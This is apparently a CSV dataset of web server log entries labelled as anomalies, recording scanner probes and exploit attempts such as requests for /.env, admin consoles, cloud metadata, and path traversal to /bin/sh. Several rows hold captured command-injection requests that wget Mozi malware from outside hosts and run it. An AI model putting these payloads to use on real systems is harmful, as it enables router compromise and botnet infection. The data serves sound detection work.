ip,date,method,endpoint,status,size,flag
15.232.150.35,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
217.56.216.59,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
216.90.16.184,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
82.169.17.107,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
201.19.107.6,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
85.7.56.94,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
149.116.183.117,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
60.20.231.51,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
245.196.52.55,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
157.66.205.92,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
239.112.31.47,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
179.55.40.197,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
14.45.141.196,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
43.175.187.199,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
152.173.150.134,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
46.75.97.67,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
196.231.68.147,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
208.112.168.152,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
152.203.150.229,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
246.20.119.149,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
84.44.128.204,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
84.69.68.240,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
153.234.87.237,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
6.99.133.197,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
37.159.115.167,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
119.8.103.108,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
110.209.41.195,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
154.32.170.12,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
186.28.108.248,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
235.68.202.132,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
180.27.30.213,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
143.232.37.84,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
185.141.247.90,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
249.229.246.86,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
244.34.38.73,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
72.237.43.198,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
212.45.189.214,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
46.57.235.85,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
90.26.105.186,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
45.153.112.121,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
92.128.20.188,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
58.54.207.28,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
218.48.77.27,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
139.213.252.166,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
121.233.145.184,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
85.0.9.65,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
9.165.250.122,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
178.100.44.87,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
142.225.190.225,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
214.214.70.186,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
122.232.157.105,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
210.250.215.127,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
77.227.220.245,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
241.17.75.251,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
129.69.201.30,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
14.216.224.165,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
172.114.112.4,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
151.226.239.76,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
106.108.118.102,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
203.33.238.225,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
214.170.164.198,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
50.145.114.141,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
190.66.156.1,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
169.229.88.90,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
13.155.53.61,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
101.194.210.155,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
193.220.121.250,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
194.123.110.207,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
201.125.36.11,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
199.216.121.26,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
94.203.129.74,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
160.90.201.74,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
128.61.211.230,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
83.160.65.230,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
58.12.168.10,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
243.224.12.135,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
128.199.160.142,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
49.205.126.142,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
44.193.58.151,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
236.252.15.202,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
224.82.95.83,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
149.91.132.229,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
212.158.238.171,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
157.4.28.148,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
239.10.119.221,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
138.209.59.167,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
208.73.13.81,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
32.149.93.25,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
15.165.61.32,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
54.245.196.130,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
30.231.212.186,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
88.49.26.134,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
219.7.245.125,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
225.66.35.185,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
76.2.160.150,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
66.204.2.84,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
47.218.85.164,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
35.238.78.250,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
139.180.248.68,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
190.56.62.98,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
112.74.120.0,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
184.14.109.101,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
155.167.126.38,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
131.133.45.253,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
253.18.90.40,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
46.174.230.103,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
218.8.131.241,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
231.118.55.207,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
21.28.51.53,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
92.71.62.92,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
146.251.126.113,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
158.242.148.128,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
185.244.143.70,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
234.47.44.56,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
68.82.18.7,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
234.62.7.2,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
21.214.163.151,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
129.222.141.8,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
185.230.22.247,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
218.100.131.68,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
41.177.121.67,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
50.161.26.204,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
220.155.123.79,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
189.253.42.208,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
111.225.143.37,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
24.142.147.227,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
129.167.225.233,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
214.40.197.93,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
39.223.33.244,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
111.206.128.2,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
31.42.94.246,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
106.66.92.235,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
80.28.99.246,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
63.1.127.229,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
124.54.190.219,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
81.206.242.254,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
96.245.231.207,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
80.188.97.70,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
196.33.141.116,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
78.25.34.11,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
56.133.194.40,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
193.123.109.230,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
146.16.196.42,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
242.216.74.66,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
223.94.120.228,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
182.172.151.57,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
128.191.18.96,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
152.242.29.150,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
192.129.67.74,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
28.36.145.13,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
106.77.59.209,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
232.185.36.153,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
166.37.226.64,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
34.90.184.153,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
225.210.94.167,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
171.15.182.4,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
171.241.214.240,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
75.215.117.161,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
138.3.67.45,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
32.234.103.182,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
137.95.15.237,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
218.174.213.35,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
4.85.241.178,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
171.153.52.119,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
20.27.78.97,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
73.105.64.229,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
55.42.117.185,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
20.42.247.64,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
156.202.196.105,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
130.60.139.43,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
165.39.133.170,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
199.252.146.165,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
64.163.54.145,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
206.127.125.220,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
237.126.52.10,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
230.186.125.219,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
251.137.134.145,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
180.168.69.248,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
147.79.214.167,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
35.135.82.177,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
237.19.206.103,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
105.13.203.245,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
180.7.78.190,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
42.147.151.58,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
81.44.244.149,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
210.144.61.96,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
225.18.76.27,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
198.26.20.201,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
193.180.185.174,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
197.254.201.113,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
158.51.174.125,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
48.65.44.11,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
46.94.176.241,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
18.198.162.70,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
93.248.139.241,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
178.111.149.196,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
128.65.46.252,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
138.209.214.164,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
150.71.96.158,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
134.170.211.26,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
155.101.27.73,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
46.246.91.206,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
237.13.192.166,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
26.51.191.164,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
67.197.222.226,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
158.89.144.167,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
49.59.99.108,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
238.236.248.202,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
52.88.80.48,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
43.163.70.5,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
111.201.79.91,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
70.204.121.70,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
153.43.236.86,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
152.183.165.147,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
212.171.192.60,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
34.101.64.147,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
141.164.231.35,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
74.233.74.185,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
103.178.179.170,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
161.17.48.145,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
242.134.100.243,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
31.60.216.253,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
136.154.53.166,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
123.247.149.122,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
97.229.168.50,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
197.171.89.10,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
39.143.184.231,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
253.21.173.124,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
247.143.139.223,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
150.17.116.58,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
26.196.3.80,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
7.49.200.184,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
169.150.94.17,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
242.31.185.240,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
53.232.230.107,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
56.95.73.158,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
248.237.122.118,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
254.87.125.200,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
203.54.0.185,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
143.107.149.161,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
44.8.59.213,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
85.241.6.134,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
219.207.57.157,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
243.22.30.61,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
174.27.16.148,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
30.55.194.84,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
217.247.20.9,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
58.72.128.57,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
36.173.13.87,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
2.240.178.122,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
202.43.82.3,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
